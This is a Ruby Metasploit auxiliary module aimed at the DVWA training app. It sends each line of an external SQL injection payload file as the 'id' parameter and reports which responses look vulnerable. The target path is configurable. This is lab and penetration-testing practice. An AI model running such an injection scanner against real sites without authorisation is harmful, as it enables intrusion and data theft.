require 'nokogiri'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize
    super(
      'Name'        => 'DVWA SQL Injection',
      'Description' => 'DVWA SQL Injection Attacker',
      'Author'      => 'huti',
      'License'     => MSF_LICENSE
      )

    register_options([
        OptEnum.new('METHOD', [true, 'HTTP Method', 'GET', ['GET', 'POST'] ]),
        OptString.new('PATH', [ false,  "The path to test SQL injection", '/vulnerabilities/sqli/']),
        OptString.new('Inject_List_Path', [ true,  "Inject List File Path", '/root/dvwa/sql_injection_list']),
        OptString.new('COOKIE',[ false, "HTTP Cookies", ''])
      ])
  
    deregister_options('SSL','VHOST')
  end


  def run
	http_method = datastore['METHOD'].upcase
	inject_file_path = datastore['Inject_List_Path']

	File.open(inject_file_path).readlines.each do |line|
		if http_method == "GET"
			res = send_request_cgi({
			'uri'  => normalize_uri(datastore['PATH']),
			'vars_get' => {'id' => line.chomp,
				      'Submit' => 'Submit'},
			'method'  => http_method,
                        'cookie' => datastore['COOKIE']
			})
		else
			res = send_request_cgi({
			'uri'  => normalize_uri(datastore['PATH']),
			'method'  => http_method,
                        'ctype' => 'application/x-www-form-urlencoded',
                        'cookie' => datastore['COOKIE'],
			'vars_post' => {'id' => line.chomp,
				       'Submit' => 'Submit'}
			})
		end

		begin
		parse = Nokogiri::HTML.parse(res.body)
		vul_area = parse.at('div[class="vulnerable_code_area"]')
		pre = vul_area.search('pre')
		
		if pre.length > 1
			print_status("Vulnerable!! #{line}")
		else
			print_status("Not Vulnerable!! #{line}")
		end
		rescue NoMethodError => nme
			print_status("Error!! #{line}")
		end
	end
  end

end

    

